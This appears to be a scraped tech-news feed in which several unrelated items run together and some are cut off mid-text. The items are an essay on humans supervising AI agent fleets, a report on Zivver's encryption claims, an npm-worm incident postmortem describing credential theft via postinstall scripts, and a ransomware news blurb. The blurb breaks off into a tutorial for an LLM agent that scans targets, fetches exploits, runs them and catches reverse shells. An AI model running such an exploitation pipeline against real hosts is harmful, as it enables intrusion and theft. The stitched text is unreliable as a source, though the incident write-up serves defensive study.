not correct, the human rejects it and sends the agents back to replanning, providing information about what needs to be altered.Let us take Lisanne Bainbridge’s recommendation and compare it to this approach that is currently “best practice” to control an AI agent fleet.Unless we tell them to act differently, LLMs and also AI agents based on them are quite chatty. Additionally, they tend to communicate with an air of utter conviction. Thus, they present to you this highly detailed, multi-step plan of what they intend to do, including lots of explanations, in this perfectly convinced tone. Often, these plans are more than 50 or 100 lines of text, sometimes even several hundred lines.Most of the time, the plans are fine. However, sometimes the AI agents mess things up. They make wrong conclusions, or they forget what they are told to do and drift off – not very often, but it happens. Sometimes the problem is obvious at first sight. But more often, it is neatly hidden somewhere behind line 123: “… and because 2 is bigger than 3, it is clear, we need to < do something critical >”. But because it is so much text the agents flood you with all the time and because the error is hidden so well behind this wall of conviction, we miss it – and the AI agent does something critical wrong.We cannot blame the person for missing the error in the plan. The problem is that this is probably the worst UI and UX possible for anyone who is responsible for avoiding errors in a system that rarely produces errors.But LLM-based agents make errors all the time, you may say. Well, not all the time. Sometimes they do. And the better the instructions and the setup of the interacting agents, the fewer errors they produce. Additionally, we can expect more specialized and refined agents in the future that become increasingly better in their respective areas of expertise. Still, most likely they will never become completely error-free because of the underlying technology that cannot guarantee consistent correctness.This is the setting we need to ponder if we talk about the user interface for a human observer: a setting where the agent fleet only rarely makes errors but we still need a human monitoring and intervening if things should go wrong. It is not yet clear how such an interface should look like, but most definitely not as it looks now. Probably we could harvest some good insights from our UX/UI design colleagues for industrial production plant control stations. We would need only to ask them …Lisanne Bainbridge then makes several recommendations regarding the required training of the human operator. This again is a rich section, and I can only recommend reading it on your own because it contains several subtle yet important hints that are hard to bring across without citing the whole chapter. Here, I will highlight only a few aspects. She starts with:[Some points made in the previous section] make it clear that it can be important to maintain manual skills.Then she talks about letting the human operator take over control regularly, i.e., do the job instead of the machine as a very effective training option. Actually, without doing hands-on work regularly, the skills of a human expert deteriorate surprisingly fast.But if taking over the work regularly is not an option, e.g., because we want continuous superhuman productivity leveraging AI agents (no matter if it makes sense or not), we still need to make sure that the human operator can take over if needed. In such a setting, training must take place in some other way, usually using some kind of simulator.However, there is a problem with simulators, especially if human intervention is only needed (and wanted) if things do not work as expected:There are problems with the use of any simulator to train for extreme situations. Unknown faults cannot be simulated, and system behaviour may not be known for faults which can be predicted but have not been experienced.The consequence of this issue is:This means that training must be concerned with general strategies rather than specific responses […]It is inadequate to expect the operator to react to unfamiliar events solely by consulting operating procedures. These cannot cover all the possibilities, so the operator is expected to monitor them and fill in the gaps.Which leaves us with the irony:However, it is ironic to train operators in following instructions and then put them in the system to provide intelligence.This is a problem we will need to face with AI agents and their supervising humans in the future, too. The supervising experts are meant to intervene whenever things become messy, whenever the AI agents get stuck, often in unforeseen ways. These are not regular tasks. Often, these are also not the issues we expect an AI agent to run into and thus can provide training for. These are extraordinary situations, the ones we do not expect – and the more refined and specialized the AI agents will become in the future, the more often the issues that require human intervention will be of this kind.How can we train human operators at all to be able to intervene skillfully in exceptional, usually hard to solve situations?How can we train a human operator so that their skills remain sharp over time and they remain able to address an exceptional situation quickly and resourcefully?The questions seem to hint at a sort of paradox, and an answer to both questions is all but obvious. At the moment, we still have enough experienced subject matter experts that the questions may feel of lower importance. But if we only start to address the questions when they become pressing, they will be even harder – if not impossible – to solve.To end this consideration with the words of Lisanne Bainbridge:Perhaps the final irony is that it is the most successful automated systems, with rare need for manual intervention, which may need the greatest investment in human operator training.In other words, we cannot simply take a few available human experts and make them supervise agents that took over their work without any further investments in the humans. Instead, we need to train them continuously, and the better the agents become, the more expensive the training of the supervisors will become. I highly doubt that decision makers who primarily think about saving money when it comes to AI agents are aware of this irony.As I wrote in the beginning of first part of this blog series, “The ironies of automation” is a very rich and dense paper. We are still only at the end of the second chapter “Approaches to solutions” which is two and a half pages into the paper and there is still a whole third chapter called “Human-computer collaboration” which takes up another page until we get to the conclusion.While this third chapter also contains a lot of valuable advice that goes well beyond our focus here, I will leave it to you to read it on your own. As I indicated at the beginning, this paper is more than worth the time spent on it.However, before finishing this little blog series, I would like to mention a new kind of dilemma that Lisanne Bainbridge did not discuss in her paper because the situation was a bit different with industrial production plant automation than with AI-agent-based automation. But as this topic fits nicely into the just-finished training paradox section, I decided to add it here.The issue is that just monitoring an AI agent fleet doing its work and intervening if things go wrong usually is not sufficient, at least not yet. All the things discussed before apply, but there is more to interacting with AI agents because we cannot simply be reactive with AI agents. We cannot simply watch them doing their work and only intervene if things go wrong. Instead, we additionally need to be proactive with them: We need to  them.We need to tell the AI agents what to do, what not to do, which chunks to pick and so on. This is basically a . While you do not lead humans, the kind of work is quite similar: You are responsible for the result; you are allowed to set directions and constraints, but you do not immediately control the work. You only control it through communicating with the agents and trying to direct them in the right direction with orders, with feedback, with changed orders, with setting different constraints, etcetera.This is a skill set most people do not have naturally. Usually, they need to develop it over time. Typically, before people are put in a leadership role directing humans, they will get a lot of leadership training teaching them the skills and tools needed to lead successfully. For most people, this is essential because if they come from the receiving end of orders (in the most general sense of “orders”), typically they are not used to setting direction and constraints. This tends to be a completely new skill they need to learn.This does not apply only to leading humans but also to leading AI agents. While AI agents are not humans, and thus leadership will be different in detail, the basic skills and tools needed are the same. This is, BTW, one of the reasons why the people who praise agentic AI on LinkedIn and the like are very often managers who lead (human) teams. For them, leading an AI agent fleet feels very natural because it is very close to the work they do every day. However, for the people currently doing the work, leading an AI agent fleet usually does not feel natural at all.However, I have not yet seen anyone receiving any kind of leadership training before being left alone with a fleet of AI agents, and I still see little discussion about the issue. “If it does not work properly, you need better prompts” is the usual response if someone struggles with directing agents successfully.Sorry, but it is not that easy. The issue is much bigger than just optimizing a few prompts. The issue is that people have to change their approach completely to get any piece of work done. Instead of doing it directly, they need to learn how to get it done indirectly. They need to learn how to direct a group of AI agents effectively, how to  them.This also adds to the training irony of the previous topic. Maybe the AI agent fleets will become good enough in the future that we can omit the proactive part of the work and only need to focus on the reactive part of the work, the monitor-and-intervene part. But until then, we need to teach human supervisors of AI agent fleets how to lead them effectively.We discussed several ironies and paradoxes from Lisanne Bainbridge’s “The ironies of automation” and how they also apply to agentic AI. We looked at the unlearning and recall dilemma and what it means for the next generation of human supervisors. We discussed monitoring fatigue and the status issue. We looked at the UX and UI deficiencies of current AI agents and the training paradox. And we finally looked at the leadership dilemma, which Lisanne Bainbridge did not discuss in her paper but which complements the training paradox.I would like to conclude with the conclusion of Lisanne Bainbridge:[…] humans working without time-pressure can be impressive problem solvers. The difficulty remains that they are less effective when under time pressure. I hope this paper has made clear both the irony that one is not by automating necessarily removing the difficulties, and also the possibility that resolving them will require even greater technological ingenuity than does classic automation.I think over time we will become clear on how much “The ironies of automation” also applies to automation done with AI agents and that we cannot ignore the insights known for more than 40 years meanwhile. I am also really curious how the solutions to the ironies and paradoxes will look like.Until then, I hope I gave you a bit of food for thought to ponder. If you should have some good ideas regarding the ironies and how to address them, please do not hesitate to share them with the community. We learn best by sharing and discussing, and maybe your contribution will be a step towards solving the issues discussed …]]></content:encoded></item><item><title>Kimi K2 1T model runs on 2 512GB M3 Ultras</title><link>https://twitter.com/awnihannun/status/1943723599971443134</link><author>jeudesprits</author><category>dev</category><pubDate>Sun, 14 Dec 2025 13:04:34 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>The Gorman Paradox: Where Are All the AI-Generated Apps?</title><link>https://codemanship.wordpress.com/2025/12/14/the-gorman-paradox-where-are-all-the-ai-generated-apps/</link><author>ArmageddonIt</author><category>dev</category><pubDate>Sun, 14 Dec 2025 12:18:59 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[In 1950, while discussing the recent wave of flying saucer reports over lunch with colleagues at Los Alamos National Laboratory in New Mexico, physicist Enrico Fermi asked a simple question.There are hundreds of billions of stars in our Milky Way galaxy, and – presumed at the time – a significant percentage have Earth-like habitable planets orbiting them.

While Zivver says these documents are encrypted, an investigation by Follow the Money shows that the company is able to read their contents.Cybersecurity and intelligence experts told Follow the Money that the takeover should either have been prevented or properly assessed in advance. Zivver processes information that could be extremely valuable to third parties, such as criminals or foreign intelligence services. That information is now subject to invasive U.S. law, and overseen by a company with well-documented links to Israeli intelligence.How was this investigated?Follow the Money investigated the acquisition of Zivver and the management of Kiteworks, and spoke to experts in intelligence services and cyber security.When the American data security company Kiteworks bought out its Dutch industry peer Zivver in June, CEO Jonathan Yaron described it as “a proud moment for all of us”. The purchase was “a significant milestone in Kiteworks’ continued mission to safeguard sensitive data across all communication channels”, he added in a LinkedIn post. But what Yaron did not mention was that this acquisition – coming at a politically charged moment between the U.S. and the EU – put highly sensitive, personal data belonging to European and British citizens directly into American hands. Zivver is used by institutions including hospitals, health insurers, government services and immigration authorities in countries including the Netherlands, Germany, Belgium and the U.K.Neither did Yaron mention that much of Kiteworks’ top management – himself included – are former members of an elite Israeli Defence Force unit that specialised in eavesdropping and breaking encrypted communications. Our journalism is only possible thanks to the trust of our  paying members. Not a member yet?  Sign up nowIn addition to this, an investigation by Follow the Money shows that data processed by Zivver is less secure than the service leads its customers to believe. Research found that emails and documents sent by Zivver can be read by the company itself. This was later confirmed by Zivver to Follow the Money.“All of the red flags should have been raised during this acquisition”Zivver maintained, however, that it does not have access to the encryption keys used by customers, and therefore cannot hand over data to U.S. authorities. This is despite independent researchers confirming that the data was – for a brief period – accessible to the company. If U.S. officials wanted access to such communication, Zivver would be legally obligated to provide it.Cybersecurity experts now point to serious security concerns, and ask why this sale seems to have gone through without scrutiny from European authorities.“All of the red flags should have been raised during this acquisition,” said intelligence expert Hugo Vijver, a former long-term officer in AIVD, the Dutch security service.Amsterdam-based Zivver – which was founded in 2015 by Wouter Klinkhamer and Rick Goud – provides systems for the encrypted exchange of information via email, chat and video, among other means. Dutch courts, for example, work with Zivver to send classified documents, and solicitors use the service to send confidential information to the courts. Other government agencies in the Netherlands – including the immigration service – also use Zivver. So do vital infrastructure operators such as the Port of Rotterdam and The Hague Airport. In the U.K., a number of NHS hospitals and local councils  In  it is used in major hospitals. The information that Zivver secures for its customers is therefore confidential and sensitive by nature. When approached by Follow the Money, a number of governmental agencies said the company’s Dutch origins were a big factor in their decision to use Zivver. Additionally, the fact that the data transferred via Zivver was stored on servers in Europe also played a role in their decisions. Now that Zivver has been acquired by a company in the United States, that data is subject to far-reaching American laws. This means that the U.S. government can request access to this information if it wishes, regardless of where the data is stored.These laws are not new, but they have become even more draconian since U.S. President Donald Trump's return to office, according to experts.Bert Hubert, a former regulator of the Dutch intelligence services, warned: “America is deteriorating so rapidly, both legally and democratically, that it would be very naive to hand over your courts and hospitals to their services.” “Trump recently called on Big Tech to ignore European legislation. And that is what they are going to do. We have no control over it,” he added.In Europe, Hubert said: “We communicate almost exclusively via American platforms. And that means that the U.S. can read our communications and disrupt our entire society if they decide that they no longer like us.”Zivver had offered an alternative – a European platform governed by EU law. “We are now throwing that away. If you want to share something confidential with a court or government, consider using a typewriter. That's about all we have left,” Hubert said.Beyond American jurisdiction, Kiteworks’ management raises another layer of concern: its links to Israeli intelligence.Several of the company’s top executives, including CEO Yaron, are veterans of Unit 8200, the elite cyber unit of the Israel Defence Force (IDF). The unit is renowned for its code-breaking abilities and feared for its surveillance operations.In Israel, there is a revolving door between the army, lobby, business and politicsUnit 8200 has been linked to major cyber operations, including the Stuxnet attack on Iranian nuclear facilities in 2007. More recently, it was accused of orchestrating the detonation of thousands of pagers in Lebanon, an incident the United Nations said violated international law and killed at least two children.The unit employs thousands of young recruits identified for their digital skills. It is able to intercept global telephone and internet traffic.International media have reported that Unit 8200 intercepts and stores an average of one million Palestinian phone calls every hour, data that ends up on Microsoft servers in Europe.Some veterans themselves have also objected to the work of the unit. In 2014, dozens of reservists signed a letter to Israeli leaders saying they no longer wanted to participate in surveillance of the occupied territories.“The lines of communication between the Israeli defence apparatus and the business community have traditionally been very short,” said Dutch intelligence expert Vijver. “In Israel, there is a revolving door between the army, lobby, business and politics.”That revolving door is clearly visible in big U.S. tech companies – and Kiteworks is no exception.Aside from Yaron, both Chief Business Officer Yaron Galant and Chief Product Officer  served in Unit 8200, according to publicly available information.They played a direct role in negotiating the acquisition of Zivver. Their background was known to Zivver’s directors Goud and Klinkhamer at the time.Other senior figures also have military intelligence backgrounds. Product director Ron Margalit worked in Unit 8200 before serving in the office of Israeli Prime Minister Benjamin Netanyahu. Mergers and acquisitions director Uri Kedem is a former Israeli naval captain.Kiteworks is not unique in this respect. Increasing numbers of U.S. cybersecurity firms now employ former Israeli intelligence officers. This trend, experts say, creates vulnerabilities that are rarely discussed.An independent researcher quoted by U.S.  said: “Not all of these veterans will send classified data to Tel Aviv. But the fact that so many former spies work for these companies does create a serious vulnerability: no other country has such access to the Or, as the ex-intelligence regulator Hubert put it: “Gaining access to communication flows is part of Israel’s long-term strategy. A company like Zivver fits perfectly into that strategy.”The information handled by Zivver – confidential communications between governments, hospitals and citizens – is a potential goldmine for intelligence services.According to intelligence expert Vijver, access to this kind of material makes it easier to pressure individuals into cooperating with intelligence agencies. Once an intelligence service has access to medical, financial and personal data, it can more easily pressure people into spying for it, he said.But the gain for intelligence services lies not just in sensitive information, said Hubert: “Any data that allows an agency to tie telephone numbers, addresses or payment data to an individual is of great interest to them.” He added: “It is exactly this type of data that is abundantly present in communications between civilians, governments and care institutions. In other words, the information that flows through a company like Zivver is extremely valuable for intelligence services.”These geopolitical concerns become more pronounced when combined with technical worries about Zivver’s encryption. For years, Zivver presented itself as a European alternative that guaranteed privacy. Its marketing materials claimed that messages were encrypted on the sender’s device and that the company had “zero access” to content. But an investigation by two cybersecurity experts at a Dutch government agency, at the request of Follow the Money, undermines this claim. The experts, who participated in the investigation on condition of anonymity, explored what happened when that government agency logged into Zivver’s web application to send information.Tests showed that when government users sent messages through Zivver’s web application, the content – including attachments – was uploaded to Zivver’s servers as readable text before being encrypted. The same process applied to email addresses of senders and recipients.“In these specific cases, Zivver processed the messages in readable form,” said independent cybersecurity researcher Matthijs Koot, who verified the findings. “Even if only briefly, technically speaking it is possible that Zivver was able to view these messages,” he said.He added: “Whether a message is encrypted at a later stage makes little difference. It may help against hackers, but it no longer matters in terms of protection against Zivver.”Despite these findings, Zivver continues to insist on its website and in promotional material elsewhere – including on the U.K. government’s Digital Marketplace – that “contents of secure messages are inaccessible to Zivver and third parties”.So far, no evidence has surfaced that Zivver misused its technical access. But now that the company is owned by Kiteworks, experts see a heightened risk.Former intelligence officer Vijver puts it bluntly: “Given the links between Zivver, Kiteworks and Unit 8200, I believe there is zero chance that no data is going to Israel. To think otherwise is completely naive.”The sale of Zivver could technically have been blocked or investigated under Dutch law. According to the Security Assessment of Investments, Mergers and Acquisitions Act, such sensitive takeovers are supposed to be reviewed by a specialised agency. But the Dutch interior ministry declared that Zivver was not part of the country’s “critical infrastructure,” meaning that no review was carried out.That, in Hubert’s view, was “a huge blunder”. “It’s bad enough that a company that plays such an important role in government communications is falling into American hands, but the fact that there are all kinds of Israeli spies there is very serious,” he said.“The takeover is taking place in an unsafe world full of geopolitical tensions”Experts say the Zivver case highlights Europe’s lack of strategic control over its digital infrastructure.Mariëtte van Huijstee of the Netherlands-based  said: “I doubt whether the security of sensitive emails and files … should be left to the private sector. And if you think that is acceptable, should we leave it to non-European parties over whom we have no control?”“We need to think much more strategically about our digital infrastructure and regulate these kinds of issues much better, for example by designating encryption services as vital infrastructure,” she added.Zivver, for its part, claimed that security will improve under Kiteworks. Zivver’s full responses to Follow the Money’s questions can be read here and here.But Van Huijstee was not convinced.“Kiteworks employs people who come from a service that specialises in decrypting files,” she said. “The takeover is taking place in an unsafe world full of geopolitical tensions, and we are dealing with data that is very valuable. In such a case, trust is not enough and more control is needed.”]]></content:encoded></item><item><title>CVE-2025-14656 - Tenda AC20 openSchedWifi httpd buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-14656</link><author></author><category>vulns</category><pubDate>Sun, 14 Dec 2025 11:15:40 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-14656

Linus Torvalds?The commit message was just "init."Within seconds, our #git Slack channel exploded with notifications. Dozens of force-pushes. PRs closing across multiple repositories. All attributed to one of our engineers.We had been compromised by Shai-Hulud 2.0, a sophisticated npm supply chain worm that compromised over 500 packages, affected 25,000+ repositories, and spread across the JavaScript ecosystem. We weren't alone: PostHog, Zapier, AsyncAPI, Postman, and ENS were among those hit.This is the complete story of what happened, how we responded, and what we've changed to prevent this from happening again.No Trigger.dev packages were ever compromised. The  packages and  CLI were never infected with Shai-Hulud malware. This incident involved one of our engineers installing a compromised package on their development machine, which led to credential theft and unauthorized access to our GitHub organization. Our published packages remained safe throughout.Malicious packages go liveLegitimate engineer work (from Germany)Attacker monitors engineer activityOn the evening of November 24th, around 20:27 UTC (9:27 PM local time in Germany), one of our engineers was experimenting with a new project. They ran a command that triggered . At that moment, somewhere in the dependency tree, a malicious package executed.We don't know exactly which package delivered the payload. The engineer was experimenting at the time and may have deleted the project directory as part of cleanup. By the time we investigated, we couldn't trace back to the specific package. The engineer checked their shell history and they'd only run install commands in our main trigger repo, cloud repo, and one experimental project.This is one of the frustrating realities of these attacks: once the malware runs, identifying the source becomes extremely difficult. The package doesn't announce itself. The  completes successfully. Everything looks normal.What we do know is that the Shai-Hulud malware ran a  script that:Downloaded and executed TruffleHog, a legitimate security tool repurposed for credential theftScanned the engineer's machine for secrets: GitHub tokens, AWS credentials, npm tokens, environment variablesExfiltrated everything it foundWhen the engineer later recovered files from their compromised laptop (booted in recovery mode), they found the telltale signs:The  directory and trufflehog_3.91.1_darwin_amd64.tar.gz file found on the compromised machine. The  directory was empty, likely cleaned up by the malware to cover its tracks.17 hours of reconnaissanceThe attacker had access to our engineer's GitHub account for 17 hours before doing anything visible. According to our GitHub audit logs, they operated methodically.Just over two hours after the initial compromise, the attacker validated their stolen credentials and began mass cloning:First attacker access, mass cloning begins~70 more repositories cloned (second wave)~90 repositories cloned (third wave)~70 repositories cloned (fourth wave)Attacker switches to India-based infrastructureSimultaneous cloning from both locationsThe simultaneous activity from US and India confirmed we were dealing with a single attacker using multiple VPNs or servers, not separate actors.While our engineer slept in Germany, the attacker continued their reconnaissance. More cloning at 02:56-02:59 UTC (middle of the night in Germany), sporadic activity until 05:32 UTC. Total repos cloned: 669 (527 from US infrastructure, 142 from India).Here's where it gets unsettling. Our engineer woke up and started their normal workday:Triggers workflow on cloud repo (from Germany)Git fetches from US, watching the engineerNormal PR reviews, CI workflows (from Germany)The attacker was monitoring our engineer's activity while they worked, unaware they were compromised.During this period, the attacker created repositories with random string names to store stolen credentials, a known Shai-Hulud pattern:github.com/[username]/xfjqb74uysxcni5ztngithub.com/[username]/ls4uzkvwnt0qckjq27github.com/[username]/uxa7vo9og0rzts362cThey also created three repos marked with "Sha1-Hulud: The Second Coming" as a calling card. These repositories were empty by the time we examined them, but based on the documented Shai-Hulud behavior, they likely contained triple base64-encoded credentials.10 minutes of destructionAt 15:27 UTC on November 25th, the attacker switched from reconnaissance to destruction.The attack began on our  repo from India-based infrastructure:Branch protection rejected force-pushtriggerdotdev/trigger.devThe attack continued on our main repository:triggerdotdev/trigger.dev PR #2706 (release PR)triggerdotdev/trigger.dev PR #2451triggerdotdev/trigger.dev PR #2382Branch protection rejected force-push to trigger.devtriggerdotdev/trigger.dev PR #2482At 15:32:43-46 UTC, 12 PRs on jsonhero-web were closed in 3 seconds. Clearly automated. PRs #47, #169, #176, #181, #189, #190, #194, #197, #204, #206, #208 all closed within a 3-second window.Our critical infrastructure repository was targeted next:triggerdotdev/infra PR #233Branch protection rejected force-push (India)triggerdotdev/infra PR #309Branch protection rejected force-push (India)The final PR was closed on json-infer-types at 15:37:13 UTC.We got a lucky break. One of our team members was monitoring Slack when the flood of notifications started:Our #git Slack channel during the attack. A wall of force-pushes, all with commit message "init."Every malicious commit was authored as:An attacked branch: a single "init" commit attributed to Linus Torvalds, thousands of commits behind main.We haven't found reports of other Shai-Hulud victims seeing this same "Linus Torvalds" vandalism pattern. The worm's documented behavior focuses on credential exfiltration and npm package propagation, not repository destruction. This destructive phase may have been unique to our attacker, or perhaps a manual follow-up action after the automated worm had done its credential harvesting.Within 4 minutes of detection we identified the compromised account, removed them from the GitHub organization, and the attack stopped immediately.Our internal Slack during those first minutes:"Urmmm guys? what's going on?""add me to the call @here""Nick could you double check Infisical for any machine identities""can someone also check whether there are any reports of compromised packages in our CLI deps?"Removed from GitHub organizationRemoved from Infisical (secrets manager)Removed from AWS IAM Identity CenterRemoved from Vercel and CloudflareAWS SSO sessions blocked via deny policy (sessions can't be revoked)IAM user console login deletedRepository clone actions: 669 (public and private), including infrastructure code, internal documentation, and engineering plans.Branches force-pushed: 199 across 16 repositoriesProtected branch rejections: 4. Some of our repositories have main branch protection enabled, but we had not enabled it for all repositories at the time of the incident.npm packages were  compromised. This is the difference between "our repos got vandalized" and "our packages got compromised."Our engineer didn't have an npm publishing token on their machine, and even if they did we had already required 2FA for publishing to npm. Without that, Shai-Hulud would have published malicious versions of , , and others, potentially affecting thousands of downstream users.Production databases or any AWS resources were  accessed. Our AWS CloudTrail audit showed only read operations from the compromised account:ListManagedNotificationEventsThese were confirmed to be legitimate operations by our engineer.One nice surprise: AWS actually sent us a proactive alert about Shai-Hulud. They detected the malware's characteristic behavior (ListSecrets, GetSecretValue, BatchGetSecretValue API calls) on an old test account that hadn't been used in months, so we just deleted it. But kudos to AWS for the proactive detection and notification.GitHub doesn't have server-side reflog. When someone force-pushes, that history is gone from GitHub's servers.But we found ways to recover.Push events are retained for 90 days via the GitHub Events API. We wrote a script that fetched pre-attack commit SHAs:Public repository forks still contained original commits. We used these to verify and restore branches.Developers who hadn't run  (all of us?) still had old SHAs in their local reflog.Within 7 hours, all 199 branches were restored.GitHub app private key exposureDuring the investigation, our engineer was going through files recovered from the compromised laptop and discovered something concerning: the private key for our GitHub App was in the trash folder.When you create a private key in the GitHub App settings, GitHub automatically downloads it. The engineer had created a key at some point, and while the active file had been deleted, it was still in the trash, potentially accessible to TruffleHog.Our GitHub App has the following permissions on customer repositories:Could read/write repository contentsCould read/create/modify PRsCould create/trigger deploymentsCould create/modify check runsCould mark commits as passing/failingCould read repository metadataTo generate valid access tokens, an attacker would need both the private key (potentially compromised) and the installation ID for a specific customer (stored in our database which was not compromised, not on the compromised machine).We immediately rotated the key:Private key discovered in trash folderNew key deployed to test environmentNew key deployed to productionWe found no evidence of unauthorized access to any customer repositories. The attacker would have needed installation IDs from our database to generate tokens, and our database was not compromised as previously mentioned.However, we cannot completely rule out the possibility. An attacker with the private key could theoretically have called the GitHub API to enumerate all installations. We've contacted GitHub Support to request additional access logs. We've also analyzed the webhook payloads to our GitHub app, looking for suspicious push or PR activity from connected installations & repositories. We haven't found any evidence of unauthorized activity in these webhook payloads.We've sent out an email to potentially effected customers to notify them of the incident with detailed instructions on how to check if they were affected. Please check your email for more details if you've used our GitHub app.Technical deep-dive: how Shai-Hulud worksFor those interested in the technical details, here's what we learned about the malware from Socket's analysis and our own investigation.When npm runs the  script, it executes :Downloads or locates the Bun runtimeSpawns a detached Bun process running  with output suppressedReturns immediately so  completes successfully with no warningsThe malware runs in the background while you think everything is fine.The payload uses TruffleHog to scan  for GitHub tokens (from env vars, gh CLI config, git credential helpers), AWS/GCP/Azure credentials, npm tokens from , environment variables containing anything that looks like a secret, and GitHub Actions secrets (if running in CI).Stolen credentials are uploaded to a newly-created GitHub repo with a random name. The data is triple base64-encoded to evade GitHub's secret scanning. (system info and GitHub credentials) (all environment variables) (cloud provider credentials) (filesystem secrets from TruffleHog) (GitHub Actions secrets if any)If an npm publishing token is found, the malware validates the token against the npm registry, fetches packages maintained by that account, downloads each package, patches it with the malware, bumps the version, and re-publishes, infecting more packages.This is how the worm spread through the npm ecosystem, starting from PostHog's compromised CI on November 24th at 4:11 AM UTC. Our engineer was infected roughly 16 hours after the malicious packages went live.If no credentials are found to exfiltrate or propagate, the malware attempts to delete the victim's entire home directory. Scorched earth.File artifacts to look for: , , , , , , ,  directory.Malware file hashes (SHA1):: d60ec97eea19fffb4809bc35b91033b52490ca11: 3d7570d14d34b0ba137d502f042b27b0f37a59fa: d1829b4708126dcc7bea7437c04d1f10eacd4a16We disabled npm scripts globally:This prevents , , and other lifecycle scripts from running. It's aggressive and some packages will break, but it's the only reliable protection against this class of attack.We upgraded to pnpm 10. This was significant effort (had to migrate through pnpm 9 first), but pnpm 10 brings critical security improvements. Scripts are ignored by default. You can explicitly whitelist packages that need to run scripts via pnpm.onlyBuiltDependencies. And the  setting prevents installing packages published recently.To whitelist packages that legitimately need build scripts:This prompts you to select which packages to allow (like , , ).For your global pnpm config:We switched npm publishing to OIDC. No more long-lived npm tokens anywhere. Publishing now uses npm's trusted publishers with GitHub Actions OIDC. Even if an attacker compromises a developer machine, they can't publish packages because there are no credentials to steal. Publishing only happens through CI with short-lived, scoped tokens.We enabled branch protection on all repositories. Not just critical repos or just OSS repos. Every repository with meaningful code now has branch protection enabled.We've adopted Granted for AWS SSO. Granted encrypts SSO session tokens on the client side, unlike the AWS CLI which stores them in plaintext.Based on PostHog's analysis of how they were initially compromised (via ), we've reviewed our GitHub Actions workflows. We now require approval for external contributor workflow runs on all our repositories (previous policy was only for public repositories).The ability for packages to run arbitrary code during installation is the attack surface. Until npm fundamentally changes, add this to your :Yes, some things will break. Whitelist them explicitly. The inconvenience is worth it.pnpm 10 ignores scripts by default and lets you set a minimum age for packages:Newly published packages can't be installed for 3 days, giving time for malicious packages to be detected.Branch protection takes 30 seconds to enable. It prevents attackers from pushing to a main branch, potentially executing malicious GitHub action workflows.Long-lived npm tokens on developer machines are a liability. Use trusted publishers with OIDC instead.If you don't need a credential on your local machine, don't have it there. Publishing should happen through CI only.Our #git Slack channel is noisy. That noise saved us.One of the hardest parts of this incident was that it happened to a person."Sorry for all the trouble guys, terrible experience"Our compromised engineer felt terrible, even though they did absolutely nothing wrong. It could have happened to any team member.Running  is not negligence. Installing dependencies is not a security failure. The security failure is in an ecosystem that allows packages to run arbitrary code silently.They also discovered that the attacker had made their GitHub account star hundreds of random repositories during the compromise. Someone even emailed us: "hey you starred my repo but I think it was because you were hacked, maybe remove the star?"Time from compromise to first attacker activityTime attacker had access before destructive actionDuration of destructive attack~10 minutes (15:27-15:37 UTC)Time from first malicious push to detectionTime from detection to access revocationTime to full branch recoveryRepository clone actions by attackerRepositories force-pushedProtected branch rejections]]></content:encoded></item><item><title>Bye, Mom</title><link>https://aella.substack.com/p/bye-mom</link><author>reducesuffering</author><category>dev</category><pubDate>Sun, 14 Dec 2025 08:21:59 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ClickFix Attacks Still Using the Finger, (Sat, Dec 13th)</title><link>https://isc.sans.edu/diary/rss/32566</link><author></author><category>threatintel</category><pubDate>Sat, 13 Dec 2025 19:35:30 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Offline Decryption Messenger: Concept Proposal and Request for Constructive Feedback</title><link>https://nextcloud.calzone-rivoluzione.de/s/pLoNrkgrerbSzfx</link><author>/u/calzone_rivoluzione</author><category>netsec</category><pubDate>Sat, 13 Dec 2025 16:01:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CyberVolk’s ransomware debut stumbles on cryptography weakness</title><link>https://www.bleepingcomputer.com/news/security/cybervolks-ransomware-debut-stumbles-on-cryptography-weakness/</link><author>Bill Toulas</author><category>security</category><pubDate>Sat, 13 Dec 2025 15:11:21 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The pro-Russia hacktivist group CyberVolk launched a ransomware-as-a-service (RaaS) called VolkLocker that suffered from serious implementation flaws, allowing victims to potentially decrypt files for free.

Understanding ReAct AgentsReAct (Reasoning + Acting) is a paradigm where LLMs generate reasoning traces and task-specific actions in an interleaved manner. Here’s how it works:: The agent reasons about what to do next: The agent calls a tool: The agent receives the tool output: Process continues until task is completeThought: I need to scan the target to identify services
Action: scan_target("192.168.1.100")
Observation: Port 22 open - SSH 2.0 OpenSSH_7.4

Observation: Found CVE-2023-XXXX - Remote Code Execution

Thought: This exploit looks promising, let me download it
Action: mirror_exploit("EDB-12345")
...
This is fundamentally different from simple prompt-response systems. The agent  and .I’ve equipped the agent with 7 powerful tools, each serving a specific purpose:1.  - Network Reconnaissance: The  flag performs version detection, which is crucial for finding matching exploits. The  flag speeds up the scan (timing template 4 out of 5).2.  - Vulnerability Database Search: The tool filters for Python and C/C++ exploits because they’re easier to execute and modify. JSON output gives us structured data the LLM can parse.3.  - Exploit Download4.  - Code AnalysisThis is where the magic happens. The agent  the exploit code to understand:Whether it’s a bind shell or reverse shellAny manual setup required5.  - Reverse Shell Handler: The agent needs to understand the difference between:: Target connects back to attacker (needs listener): Target opens port (direct connection): This is the most dangerous tool. In production, you’d want sandboxing and additional safety checks.Here’s the full implementation of the orchestrator with detailed comments:How It Works: Step-by-StepLet me walk you through a complete execution cycle:Phase 1: Initial ReconnaissanceUser Input: "192.168.1.100"

    "python3 12345.py 192.168.1.100 LHOST=192.168.1.50 LPORT=4444"
)
Observation: "Exploit executed. Check listener log."

Agent Thought: "The exploit has been executed. Based on the output, 
               the connection attempt was made. The user should check 
               listener_4444.log for the shell."
